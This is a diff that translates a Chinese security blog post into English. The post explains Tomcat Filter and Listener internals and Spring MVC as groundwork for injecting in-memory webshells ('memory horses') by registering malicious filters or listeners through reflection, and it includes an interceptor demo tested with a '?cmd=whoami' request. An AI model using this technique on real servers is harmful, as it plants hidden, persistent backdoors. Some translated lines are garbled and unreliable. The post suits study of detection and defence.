-这些名词其实很容易理解，首先，需要定义过滤器`FilterDef`，存放这些`FilterDef`的数组被称为`FilterDefs`，每个`FilterDef`定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及`class`等，这一点可以从`org/apache/tomcat/util/descriptor/web/FilterDef.java`的代码中看出来；然后是`FilterDefs`，它只是过滤器的抽象定义，而`FilterConfigs`则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是`FilterMaps`，它是用于将`FilterConfigs`映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的`FilterConfigs`，从而确定要执行的过滤器链；而`FilterChain`是由多个`FilterConfigs`组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照`FilterChain`中的顺序依次执行每个过滤器，对请求进行过滤和处理。
+These nouns are actually easy to understand. First, you need to define the filter `FilterDef`. The array that stores these `FilterDef` is called `FilterDefs`. Each `FilterDef` defines a specific filter, including description information, name, filter instance, and `class`, etc. This can be seen from the code of `org/apache/tomcat/util/descriptor/web/FilterDef.java`; then `FilterDefs`, which is just an abstract definition of filters, and `FilterConfigs` is the specific configuration of these filters. For example, we can define specific configuration parameters for each filter to meet the needs of the system; followed by `FilterMaps`, which is used to map `FilterConfigs` to a specific request path or other identifier, so that when the system processes the request, it can find the corresponding `FilterConfigs` according to the request path or identifier, thereby determining the filter chain to be executed; and `FilterChain` is a chain structure composed of multiple `FilterConfigs`, which defines the execution order of the filter. When processing the request, the system will execute each filter in sequence in the order in `FilterChain` to filter and process the request.
 
-## 2.5 编写一个简单的Filter
+## 2.5 Write a simple Filter
 
-我们继续用我们之前在`2.2`中搭建的环境，添加`TestFilter.java`：
+We continue to use the environment we built in `2.2` before and add `TestFilter.java`:
 
 ```java
 package org.example;
@@ -479,23 +483,23 @@ public class TestFilter implements Filter {
 }
 ```
 
-跑起来之后，控制台输出`[*] Filter初始化创建`，当我们访问`/test`路由的时候，控制台继续输出`[*] Filter执行过滤操作`，当我们结束`tomcat`的时候，会触发`destroy`方法，从而输出`[*] Filter已销毁`：
+After running, the console outputs `[*] Filter initialization creation`. When we access the `/test` route, the console continues to output `[*] Filter to perform filtering operation. When we end `tomcat`, the `destroy` method will be triggered, thus outputting `[*] Filter destroyed`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116155323191.png)
 
-## 2.6 从代码层面分析Filter运行的整体流程
+## 2.6 Analyze the overall process of Filter operation from the code level
 
-我们在上面的`demo`中的`doFilter`函数这里下断点进行调试：
+We debug the `doFilter` function in the above `demo` breakpoint here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240116180329213.png)
 
-跟进`org.apache.catalina.core.StandardWrapperValve#invoke`：
+follow up`org.apache.catalina.core.StandardWrapperValve#invoke`：
 
 ```java
 filterChain.doFilter(request.getRequest(), response.getResponse());
 ```
 
-继续跟进变量`filterChain`，找到定义处的代码：
+Continue to follow up on the variable `filterChain` and find the code at the definition:
 
 ```java
 ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);
@@ -503,7 +507,7 @@ ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117003245011.png)
 
-查看该方法（`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`）：
+View this method（`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`）：
 
 ```java
 public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {
@@ -576,29 +580,29 @@ public static ApplicationFilterChain createFilterChain(ServletRequest request, W
 }
 ```
 
-我们在该方法和下面定义`filterMaps`那行下断点进行调试，可以看到，这段代码先是判断`servlet`是否为空，如果是就表示没有有效的`servlet`，无法创建过滤器链；然后根据传入的`ServletRequest`的类型来分类处理，如果是`Request`类型，并且启用了安全性，那么就创建一个新的`ApplicationFilterChain`，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的`Servlet`和异步支持属性，这个没啥说的；关键点在于后面从`Wrapper`中获取父级上下文（`StandardContext`），然后获取该上下文中定义的过滤器映射数组（`FilterMap`）；最后遍历过滤器映射数组，根据请求的`DispatcherType`和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。
+We debug the breakpoint at the line defining `filterMaps` below. You can see that this code first determines whether `servlet` is empty. If `servlet` is null, it means that there is no valid `servlet` and the filter chain cannot be created. Then, it is classified and processed according to the type of the incoming `ServletRequest`. If it is `Request` and security is enabled, then create a new `ApplicationFilterChain`. If it is not enabled, then try to get the existing filter chain from the request. , if it does not exist, create a new one; then set the Servlet and asynchronous support attributes of the filter chain, which is nothing to say; the key point is to get the parent context (`StandardContext`) from the `Wrapper`, and then get the filter map array defined in the context (`FilterMap`); finally iterate over the filter map array, match the filter according to the requested `DispatcherType` and the request path, and add the matching filter to the filter chain, and finally return the created or updated filter chain.
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117004652307.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117004728760.png)
 
-从上面的两张图我们也可以清晰地看到`filterConfig`、`filterMap`、`FilterDef`的结构。
+From the two pictures above, we can also clearly see the structures of `filterConfig`, `filterMap`, and `FilterDef`.
 
-跟进刚才的`filterChain.doFilter`方法，位于`org.apache.catalina.core.ApplicationFilterChain#doFilter`：
+Follow up on the `filterChain.doFilter` method just now, located in `org.apache.catalina.core.ApplicationFilterChain#doFilter`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117005026102.png)
 
-可以看到都是调用了`org.apache.catalina.core.ApplicationFilterChain#internalDoFilter`方法，在这个方法中会依次拿到`filterConfig`和`filter`：
+You can see that the `org.apache.catalina.core.ApplicationFilterChain#internalDoFilter` method is called. In this method, you will get `filterConfig` and `filter` in sequence:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117005923310.png)
 
-好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个`Filter`，回顾之前的调试过程，我们发现在`createFilterChain`那个函数里面有两个关键点：
+OK, the process ends here, but our purpose is to enter the memory horse, that is, to dynamically create a `Filter`. Looking back on the previous debugging process, we found that there are two key points in the `createFilterChain` function:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117010603894.png)
 
-也就是这里我用箭头指出来的`org.apache.catalina.core.StandardContext#findFilterMaps`和`org.apache.catalina.core.StandardContext#findFilterConfig`。
+That is, here I pointed out the `org.apache.catalina.core.StandardContext#findFilterMaps` and `org.apache.catalina.core.StandardContext#findFilterConfig` with arrows.
 
-二者的实现代码粘贴如下：
+The implementation code of both is pasted as follows:
 
 ```java
 public FilterMap[] findFilterMaps() {
@@ -612,52 +616,50 @@ public FilterConfig findFilterConfig(String name) {
 }
 ```
 
-也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。
+In other words, we only need to find the existing context and insert our customized malicious filter map and filter configuration into it to dynamically add filters.
 
-那也就是说，我们现在的问题就转化为如何添加`filterMap`和`filterConfig`。我们搜索关键词`addFilterMap`，即可看到在`StandardContext`中有两个相关的方法：
+That is, our current problem translates to how to add `filterMap` and `filterConfig`. We search for the keyword `addFilterMap` and we can see that there are two related methods in `StandardContext`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117131207868.png)
 
-注释里面也说的很清楚，`addFilterMap`是在一组映射末尾添加新的我们自定义的新映射；而`addFilterMapBefore`则会自动把我们创建的`filterMap`丢到第一位去，无需再手动排序，这正是我们需要的呀！
+The comments also clearly state that `addFilterMap` is to add a new new map we customized at the end of a set of maps; while `addFilterMapBefore` will automatically throw the `filterMap` we created to the first place without manually sorting it, which is exactly what we need!
 
-可以看到，上面的`addFilterMapBefore`函数中第一步是先执行`org.apache.catalina.core.StandardContext#validateFilterMap`这个函数，点击去看看：
+You can see that the first step in the `addFilterMapBefore` function above is to execute the function `org.apache.catalina.core.StandardContext#validateFilterMap`. Click to see:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117131938707.png)
 
-发现我们需要保证它在根据`filterName`找`filterDef`的时候，得能找到，也就是说，我们还得自定义`filterDef`并把它加入到`filterDefs`，不过这个也很简单，也有对应的方法，也就是`org.apache.catalina.core.StandardContext#addFilterDef`：
+I found that we need to ensure that when we look for `filterDef` according to `filterName`, we have to find it, that is, we have to customize `filterDef` and add it to `filterDefs`. However, this is also very simple and there is a corresponding method, that is `org.apache.catalina.core.StandardContext#addFilterDef`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117132121464.png)
 
-搞定，继续去看`filterConfig`如何添加。经过搜索发现，不存在类似上面的`addFilterConfig`这种方法：
+Get it done, continue to see how to add `filterConfig`. After searching, there is no such method as `addFilterConfig` above:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117132257971.png)
 
-但是有`filterStart`和`filterStop`这两个方法：
+But there are two methods: `filterStart` and `filterStop`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117135001440.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117135022708.png)
 
-那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。
+That is to say, we can only obtain relevant attributes through reflection and add them.
 
-## 2.7 Listener简单介绍
+## 2.7 Listener brief introduction
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/tomcat.png)
 
-由上图可知，`Listener`是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的`Listener`，就又可以形成一种内存马了。
+From the above figure, we can see that `Listener` was first loaded, so based on the ideas we learned earlier, if I dynamically register a malicious `Listener`, I can form another memory horse.
+In `tomcat`, there are several common `Listener`:
 
-在`tomcat`中，常见的`Listener`有以下几种：
+- `ServletContextListener` is used to listen for the startup and shutdown events of the entire Web application. It requires two methods: `contextInitialized` and `contextDestroyed`;
+- `ServletRequestListener` is used to listen for the creation and destruction events of `HTTP` request. It requires two methods: `requestInitialized` and `requestDestroyed`;
+- `HttpSessionListener` is used to listen to the creation and destruction events of the `HTTP` session, and two methods need to be implemented: `sessionCreated` and `sessionDestroyed` are used;
+- `HttpSessionAttributeListener`, to listen for the addition, deletion and replacement events of the `HTTP` session attribute, `attributeAdded`, `attributeRemoved` and `attributeReplaced` three methods are required.
+Obviously, `ServletRequestListener` is the best for memory horses, because it can trigger operations as long as it accesses the service.
 
-- `ServletContextListener`，用来监听整个`Web`应用程序的启动和关闭事件，需要实现`contextInitialized`和`contextDestroyed`这两个方法；
-- `ServletRequestListener`，用来监听`HTTP`请求的创建和销毁事件，需要实现`requestInitialized`和`requestDestroyed`这两个方法；
-- `HttpSessionListener`，用来监听`HTTP`会话的创建和销毁事件，需要实现`sessionCreated`和`sessionDestroyed`这两个方法；
-- `HttpSessionAttributeListener`，监听`HTTP`会话属性的添加、删除和替换事件，需要实现`attributeAdded`、`attributeRemoved`和`attributeReplaced`这三个方法。
+## 2.8 Write a simple Listener (ServletRequestListener)
 
-很明显，`ServletRequestListener`是最适合做内存马的，因为它只要访问服务就能触发操作。
-
-## 2.8 编写一个简单的Listener（ServletRequestListener）
-
-我们继续用我们之前在`2.2`中搭建的环境，替换掉之前的`TestFilter.java`，重新写一个`TestListener.java`：
+We continue to use the environment we built in `2.2` before, replace the previous `TestFilter.java`, and rewrite a `TestListener.java`:
 
 ```java
 package org.example;
@@ -679,35 +681,35 @@ public class TestListener implements ServletRequestListener {
 }
 ```
 
-运行结果：
+Running results:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193153492.png)
 
-## 2.9 从代码层面分析Listener运行的整体流程
+## 2.9 Analyze the overall process of Listener operation from the code level
 
-我们在如图所示的两个地方下断点调试：
+We breakpoint debugging at two places as shown in the figure:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193334272.png)
 
-往下翻可以看到`org.apache.catalina.core.StandardContext#listenerStart`方法的调用：
+Turn down to see the call to the `org.apache.catalina.core.StandardContext#listenerStart` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117193516785.png)
 
-代码写的通俗易懂，主要有两个事情要干，一是通过`findApplicationListeners`找到这些`Listerner`的名字；二是实例化这些`listener`：
+The code is easy to understand, and there are two main things to do. One is to find the names of these `Listerners` through `findApplicationListeners`; the other is to instantiate these `listeners`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117213700704.png)
 
-接着就是分类摆放，我们需要的`ServletRequestListener`被放在了`eventListeners`里面：
+Then there is the classification arrangement. The `ServletRequestListener` we need is placed in the `eventListeners`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117223551872.png)
 
-分类摆放完了之后，干这样一件事情：
+After the classification is completed, do something like this:
 
 ```java
 eventListeners.addAll(Arrays.asList(getApplicationEventListeners()));
 ```
 
-`Arrays.asList(...)` 好理解，意思就是将数组转换为列表；`eventListeners.addAll(...)`也好理解，意思就是将括号里面的内容添加到之前实例化的监听器列表 `eventListeners` 中。关于括号里边的`org.apache.catalina.core.StandardContext#getApplicationEventListeners`这个方法，我们点进去看，代码如下：
+`Arrays.asList(...)` is easy to understand, which means converting an array into a list; `eventListeners.addAll(...)` is easy to understand, which means adding the content in brackets to the previously instantiated listener list `eventListeners`. Regarding the method `org.apache.catalina.core.StandardContext#getApplicationEventListeners` in the brackets, we click on it and the code is as follows:
 
 ```java
 @Override
@@ -716,15 +718,15 @@ public Object[] getApplicationEventListeners() {
 }
 ```
 
-也很简单明了，就是把`applicationEventListenersList`转换成一个包含任意类型对象的数组，也就是一个可能包含各种类型的应用程序事件监听器的数组。
+It is also very simple and clear, which is to convert `applicationEventListenersList` into an array containing objects of any type, that is, an array that may contain application event listeners of various types.
 
-那这总结起来就一句话，就是`Listener`有两个来源，一是根据`web.xml`文件或者`@WebListener`注解实例化得到的`Listener`；二是`applicationEventListenersList`中的`Listener`。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的`addFilterConfig`这种函数呢？当然是有的，`ctrl+左键`往上找：
+In summary, this is in one sentence, there are two sources of `Listener`. One is the `Listener` obtained from instantiation based on the `web.xml` file or `@WebListener` annotation; the other is the `Listener` in `applicationEventListenersList`. We definitely can't control the previous ones because this is for developers, not for hackers, hahaha. Then look for it. Is there any function similar to the `addFilterConfig` we used before? Of course there is, look up `ctrl+left button`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117225625995.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240117225704881.png)
 
-方法名字叫做`addApplicationEventListener`，在`StandardContext.java`里面，代码如下，完美符合我们的需求，真是太哇塞了：
+The method name is `addApplicationEventListener`. In `StandardContext.java`, the code is as follows, which perfectly meets our needs. It's so terrible:
 
 ```java
 public void addApplicationEventListener(Object listener) {
@@ -732,23 +734,23 @@ public void addApplicationEventListener(Object listener) {
 }
 ```
 
-## 2.10 简单的spring项目搭建
+## 2.10 Simple spring project construction
 
-新建个项目，设置`Server URL`为`https://start.aliyun.com/`：
+Create a new project and set the `Server URL` to `https://start.aliyun.com/`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010240710.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010435462.png)
 
-等待依赖解析完成：
+Wait for the dependency resolution to complete:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118010538774.png)
 
-这里给我们准备了一个示例，我们可以直接跑起来：
+Here is an example for us, we can run directly:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118011103790.png)
 
-### 2.10.1 编写一个简单的Spring Controller
+### 2.10.1 Write a simple Spring Controller
 
 ```java
 package org.example.springcontrollermemoryshellexample.demos.web;
@@ -767,11 +769,11 @@ public class TestController {
 }
 ```
 
-非常地简单：
+Very simple:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118011631123.png)
 
-### 2.10.2 编写一个简单的Spring Interceptor
+### 2.10.2 Write a simple Spring Interceptor
 
 `TestInterceptor.java`：
 
@@ -829,23 +831,23 @@ public class WebConfig implements WebMvcConfigurer {
 }
 ```
 
-`Controller`就是之前写的`TestController.java`，运行后访问`http://127.0.0.1:8080/?cmd=whoami`：
+`Controller` is the `TestController.java` written before. After running, access `http://127.0.0.1:8080/?cmd=whoami`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119205649551.png)
 
-### 2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）
+### 2.10.3 Write a simple Spring WebFlux Demo (based on Netty)
 
-我们先聊聊怎么自己写一个`Spring WebFlux`框架的`demo`。
+Let’s first talk about how to write a `Demo` of the `Spring WebFlux` framework by yourself.
 
-这里我们新建一个`SpringBoot`项目，取名`WebFluxMemoryShellDemo`：
+Here we create a new `SpringBoot` project and name it `WebFluxMemoryShellDemo`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121181613825.png)
 
-这里选择`Spring Reactive Web`：
+Select `Spring Reactive Web` here:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121182533113.png)
 
-接着新建两个文件，这里为了方便，我把这两个文件放到`hello`文件夹下。
+Then create two new files. For convenience, I put these two files in the `hello` folder.
 
 `GreetingHandler.java`：
 
@@ -886,74 +888,74 @@ public class GreetingRouter {
 }
 ```
 
-我们可以新建`main/resources`文件夹，然后新建`application.properties`，通过`server.port`来控制`netty`服务的端口：
+We can create a new `main/resources` folder, then create a new `application.properties`, and control the port of the `netty` service through `server.port`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121182911474.png)
 
-接着我们运行：
+Then we run:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121183100943.png)
 
-这里我从`github`上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是`Netty`+`SpringWebFlux`：
+Here I found a project from github, which can also help us understand how this framework is used, using `Netty`+`SpringWebFlux`:
 
 > https://github.com/Java-Techie-jt/springboot-webflux-demo
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240121135125819.png)
 
-随便访问个路由。例如`http://127.0.0.1:9191/customers/stream`：
+Access any route. For example `http://127.0.0.1:9191/customers/stream`:
 
 ![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/customers_stream.gif)
 
-## 2.11 Spring MVC介绍
+## 2.11 Spring MVC Introduction
 
-如果想要深入理解`Spring MVC`框架型内存马，那么对`Spring MVC`的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。
+If you want to have an in-depth understanding of the `Spring MVC` framework-type memory horse, then it is very necessary to understand the basic understanding of `Spring MVC`. This section will briefly talk to you about this framework from the source code level.
 
-首先引用《`Spring in Action`》上的一张图（这里我重制了一下）来了解`Spring MVC`的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）：
+First, I will quote a picture from "Spring in Action" (I remake it here) to understand the core components and general processing flow of `Spring MVC` (but I didn't seem to have found this picture in the fifth edition of the book. If you find it, you can send a private message to me in the background of the official account):
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/springmvc2.png)
 
-可以看到，这里有一堆名词，我们一一来看：
+You can see that there are a bunch of nouns here, let’s take a look one by one:
 
-- `DispatcherServlet`是前端控制器，它负责接收`Request`并将`Request`转发给对应的处理组件；
-- `HandlerMapping`负责完成`url`到`Controller`映射，可以通过它来找到对应的处理`Request`的`Controller`；
-- `Controller`处理`Request`，并返回`ModelAndVIew`对象，`ModelAndView`是封装结果视图的组件；
-- ④~⑦表示视图解析器解析`ModelAndView`对象并返回对应的视图给客户端。
+- `DispatcherServlet` is a front-end controller, which is responsible for receiving `Request` and forwarding `Request` to the corresponding processing component;
+- `HandlerMapping` is responsible for completing the `url` to `Controller` mapping, and you can find the corresponding `Controller` that handles `Request`;
+- `Controller` processes `Request` and returns `ModelAndVIew` object, `ModelAndView` is a component that encapsulates the result view;
+- ④~⑦ means that the view parser parses the `ModelAndView` object and returns the corresponding view to the client.
 
-还有一个概念需要了解，就是`IOC`容器，因为这个名词会在本文后面的内容中提及。
+There is another concept that needs to be understood, which is the `IOC` container, because this noun will be mentioned later in this article.
 
-`IOC`（控制反转）容器是`Spring`框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。`IOC`容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。`Spring`框架提供了多种实现`IOC`容器的方式，下面讲两种常见的：
+`IOC` (Control Inversion) containers are one of the core concepts of the Spring framework. Its basic idea is to reverse control of objects such as creation, assembly, and management from application code to containers, so that application components do not need to directly manage their dependencies.The `IOC` container is mainly responsible for object creation, dependency injection, life cycle management and configuration management. The `Spring` framework provides a variety of ways to implement `IOC` containers. The following are two common ones:
 
-- `BeanFactory`：`Spring`的最基本的`IOC`容器，提供了基本的`IOC`功能，只有在第一次请求时才创建对象。
+- BeanFactory: Spring's most basic `IOC` container, which provides basic `IOC` functionality, and objects are created only on the first request.
 
-- `ApplicationContext`：这是`BeanFactory`的扩展，提供了更多的企业级功能。`ApplicationContext`在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。
+- `ApplicationContext`: This is an extension of `BeanFactory` that provides more enterprise-level features. `ApplicationContext` preloads and initializes all singleton objects when the container starts, which provides faster access speeds.
 
-### 2.11.1 Spring MVC九大组件
+### 2.11.1 Spring MVC nine components
 
-这九大组件需要有个印象：
+These nine components need to have an impression:
 
-`DispatcherServlet`（派发`Servlet`）：负责将请求分发给其他组件，是整个`Spring MVC`流程的核心；
-`HandlerMapping`（处理器映射）：用于确定请求的处理器（`Controller`）；
-`HandlerAdapter`（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；
-`HandlerInterceptor`（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；
-`Controller`（控制器）：处理用户请求并返回适当的模型和视图；
-`ModelAndView`（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；
-`ViewResolver`（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；
-`LocaleResolver`（区域解析器）：处理区域信息，用于国际化；
-`ThemeResolver`（主题解析器）：用于解析`Web`应用的主题，实现界面主题的切换。
+`DispatcherServlet` (distribute `Servlet`): Responsible for distributing requests to other components, and is the core of the entire `Spring MVC` process;
+`HandlerMapping` (processor mapping): the processor used to determine the request (`Controller`);
+`HandlerAdapter` (processor adapter): Map requests to appropriate processor methods, responsible for executing processor methods;
+`HandlerInterceptor` (processor interceptor): allows interception and intervention on the processor's execution process;
+`Controller` (controller): Process user requests and return appropriate models and views;
+`ModelAndView` (model and view): encapsulates the execution results of the processor method, including model data and view information;
+`ViewResolver` (view resolver): used to resolve logical view names into specific view objects;
+`LocaleResolver` (region parser): handles regional information for internationalization;
+`ThemeResolver` (theme parser): used to parse the theme of the `Web` application and realize the switching of interface themes.
 
-### 2.11.2 简单的源码分析
+### 2.11.2 Simple source code analysis
 
-#### 2.11.2.1 九大组件的初始化
+#### 2.11.2.1 Initialization of nine components
 
-首先是找到`org.springframework.web.servlet.DispatcherServlet`，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数：
+First, find `org.springframework.web.servlet.DispatcherServlet`, and you can see that there are many component definitions and initialization functions and some other functions:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118153801770.png)
 
-但是没有`init()`函数，我们翻看其父类`FrameworkServlet`的父类`org.springframework.web.servlet.HttpServletBean`的时候发现有`init`函数：
+But without the `init()` function, when we look at the parent class `org.springframework.web.servlet.HttpServletBean` of its parent class `FrameworkServlet`, we found that there is an `init` function:rvletBean` of its parent class `FrameworkServlet`, we found that there is an `init` function:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118153925178.png)
 
-代码如下：
+The code is as follows:
 
 ```java
 @Override
@@ -982,17 +984,17 @@ public final void init() throws ServletException {
 }
 ```
 
-先是从`Servlet`的配置中获取初始化参数并创建一个`PropertyValues`对象，然后设置`Bean`属性；关键在最后一步，调用了`initServletBean`这个方法。
+First, we get the initialization parameters from the Servlet configuration and create a `PropertyValues` object, and then set the `Bean` property; the key is initServletBean` method is called.
 
-我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候`override`了该方法：
+After we clicked in, we found that the function did not write anything, which means that it should be a subclass inheritance `override` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154412364.png)
 
-果不其然，我们在`org.springframework.web.servlet.FrameworkServlet`中成功找到了该方法：
+Sure enough, we successfully found the method in `org.springframework.web.servlet.FrameworkServlet`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154436747.png)
 
-代码如下：
+The code is as follows:
 
 ```java
 @Override
@@ -1026,106 +1028,106 @@ protected final void initServletBean() throws ServletException {
 }
 ```
 
-这段代码的`log`和计时部分就不说了，我们捡关键的说。它先是调用`initWebApplicationContext`方法，初始化`IOC`容器，在初始化的过程中，会调用到这个`onRefresh`方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务：
+I won’t talk about the `log` and timing part of this code, let’s talk about it with the key points.It first calls the `initWebApplicationContext` method and initializes the `IOC` container. During the initialization process, this `onRefresh` method will be called. Generally speaking, this method is a callback method called after the container refresh is completed. It performs some tasks that need to be completed immediately after the application is started:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118155901114.png)
 
-跟入该方法，可以看到其中默认为空：
+Follow this method and you can see that the default is empty:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160618786.png)
 
-说明在它的子类中应该会有`override`，果然我们定位到了`org.springframework.web.servlet.DispatcherServlet#	`方法：
+It means that there should be `override` in its subclass. Sure enough, we have located the `org.springframework.web.servlet.DispatcherServlet#` method:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160730953.png)
 
-这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了`Spring MVC`的九大组件的初始化。
+This immediately became clear. These are not the nine components we mentioned before. At this point, the initialization of the nine components of Spring MVC is completed.
 
-#### 2.11.2.2 url和Controller的关系的建立
+#### 2.11.2.2 Establishment of the relationship between url and controller
 
-你可能会有这样的一个疑惑：我们是用`@RequestMapping("/")`注解在方法上的，那`Spring MVC`是怎么根据这个注解就把对应的请求和这个方法关联起来的？
+You may have a question like this: we use `@RequestMapping("/")` to annotate on the method. How does `Spring MVC` associate the corresponding request with this method based on this annotation?
 
-从上面的九大组件的初始化中可以看到，有个方法就叫做`initHandlerMappings`，我们点进去详细看看：
+From the initialization of the nine components above, we can see that there is a method called `initHandlerMappings`. Let's click in and take a look at it in detail:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118170255776.png)
 
-这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去`ApplicationContext`（包括`ancestor contexts`）里面找所有实现了`HandlerMappings`接口的类，如果找到了至少一个符合条件的`HandlerMapping bean`，那就把它的值转化为列表，并按照Java的默认排序机制对它们进行排序，最后将排序后的列表赋值给 `this.handlerMappings`；那如果没有找到，`this.handlerMappings`就依然保持为`null`；如果不需要检测所有处理程序映射，那就尝试从`ApplicationContext`中获取名称为 `handlerMapping` 的`bean`，如果成功获取到了则将其作为单一元素的列表赋值给 `this.handlerMappings`，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的`HandlerMapping`，这也就是我们要讲的第二部分的代码。
+This code and the included annotations are also easy to understand and are divided into two parts. The first part is to find all classes that implement the `HandlerMappings` interface in `ApplicationContext` (including `ancestor contexts`). If at least one `HandlerMapping bean` that meets the conditions is found, then convert its value into a list, and sort them according to the Java default sorting mechanism. Finally, assign the sorted list to `this.handlerMappings`; if not found, `this.handlerMappings` will remain as `null`; if no handler mapping is needed, try to get the `bean` named `handlerMapping` from `ApplicationContext`, and if it is successfully obtained, assign it to a list of single elements to `this.handlerMappings`, if the acquisition fails, it doesn't matter, because the comments are very clear and a default `HandlerMapping` will be added, which is the code for the second part we are going to talk about.
 
-第二部分说的是，如果之前一套操作下来，`this.handlerMappings`还是为`null`，那么就调用 `getDefaultStrategies` 方法去获取默认的`HandlerMapping`，并将其赋给 `this.handlerMappings`。
+The second part says that if the previous set of operations is still `null`, then the `getDefaultStrategies` method is called to get the default `HandlerMapping` and assign it to `this.handlerMappings`.
 
-这么一看的话，`org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies`这个方法还是挺关键的，我们点进去看看：
+If you look at it this way, the method `org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies` is quite critical. Let's click in and take a look:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118172033745.png)
 
